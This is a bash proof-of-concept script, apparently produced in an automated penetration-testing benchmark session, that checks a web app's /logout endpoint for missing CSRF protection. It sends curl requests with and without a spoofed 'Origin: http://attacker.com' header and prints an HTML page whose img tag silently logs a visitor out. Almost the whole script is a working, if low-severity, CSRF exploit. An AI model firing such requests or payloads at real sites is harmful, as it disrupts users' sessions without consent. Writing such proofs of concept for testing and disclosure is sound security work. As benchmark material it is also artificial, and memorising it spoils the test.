#!/bin/bash
# POC: Demonstrates CSRF vulnerability on logout endpoint by triggering logout via GET request without CSRF token, simulating a cross-origin attack
# Target: ./repo
# Created: 2025-11-07T22:18:42.353Z
# Session: benchmark-XBEN-088-24-mhpe87h9

# CSRF Logout Attack POC
# This script demonstrates the Missing CSRF Protection vulnerability on the /logout endpoint
# It shows that an attacker can force a user to logout via a simple GET request without CSRF token

TARGET_URL="${1:-http://localhost}"
LOGOUT_ENDPOINT="${TARGET_URL}/logout"
LOGIN_ENDPOINT="${TARGET_URL}/login"

echo "[*] CSRF Logout Attack POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Test basic logout without CSRF token
echo "[Test 1] Testing logout endpoint for CSRF protection..."
echo "[*] Sending GET request to logout endpoint without CSRF token"

RESPONSE=$(curl -s -i "$LOGOUT_ENDPOINT" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | head -n 1 | awk '{print $2}')
LOCATION=$(echo "$RESPONSE" | grep -i "^Location:" | cut -d' ' -f2 | tr -d '\r')

echo "[Response] HTTP Status: $HTTP_CODE"
echo "[Response] Location Header: $LOCATION"
echo ""

# Step 2: Check for CSRF token validation
echo "[Test 2] Checking if CSRF tokens are required..."
if echo "$RESPONSE" | grep -qi "csrf\|token\|nonce"; then
    echo "[!] CSRF token found in response"
else
    echo "[!] No CSRF token validation - endpoint accepts requests without CSRF protection"
fi
echo ""

# Step 3: Test with Origin header (simulating cross-origin request)
echo "[Test 3] Testing with Origin header (simulating cross-origin attack)..."
echo "[*] Sending GET request with Origin: http://attacker.com"

CROSS_ORIGIN_RESPONSE=$(curl -s -i -H "Origin: http://attacker.com" "$LOGOUT_ENDPOINT" 2>&1)
CROSS_ORIGIN_CODE=$(echo "$CROSS_ORIGIN_RESPONSE" | head -n 1 | awk '{print $2}')
CROSS_ORIGIN_LOCATION=$(echo "$CROSS_ORIGIN_RESPONSE" | grep -i "^Location:" | cut -d' ' -f2 | tr -d '\r')

echo "[Response] HTTP Status: $CROSS_ORIGIN_CODE"
echo "[Response] Location Header: $CROSS_ORIGIN_LOCATION"

if [ "$CROSS_ORIGIN_CODE" = "302" ] || [ "$CROSS_ORIGIN_CODE" = "301" ]; then
    echo "[!] Cross-origin logout request ACCEPTED - CSRF vulnerability confirmed"
fi
echo ""

# Step 4: Test method restriction (if it's a GET endpoint)
echo "[Test 4] Testing if endpoint is restricted to POST..."
POST_RESPONSE=$(curl -s -i -X POST "$LOGOUT_ENDPOINT" 2>&1)
POST_CODE=$(echo "$POST_RESPONSE" | head -n 1 | awk '{print $2}')

echo "[Response] POST request HTTP Status: $POST_CODE"
if [ "$POST_CODE" = "302" ] || [ "$POST_CODE" = "301" ]; then
    echo "[!] POST method accepted (logout endpoint should preferably be POST-only for CSRF protection)"
fi
echo ""

# Step 5: Demonstrate HTML-based attack vector
echo "[Test 5] Generating HTML attack payload..."
ATTACK_PAYLOAD="<html>
<body>
<h1>Loading...</h1>
<img src=\"$LOGOUT_ENDPOINT\" onerror=\"console.log('Logout triggered')\">
</body>
</html>"

echo "[*] Attack payload that could be embedded in a malicious webpage:"
echo "$ATTACK_PAYLOAD"
echo ""

# Final verdict
echo "[VERDICT]"
if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "301" ]; then
    echo "[VULNERABLE] The /logout endpoint accepts GET requests without CSRF protection"
    echo "[VULNERABLE] An attacker can force logout via image tag, iframe, or fetch from malicious site"
    exit 0
else
    echo "[NOT_VULNERABLE] Unexpected response code: $HTTP_CODE"
    exit 1
fi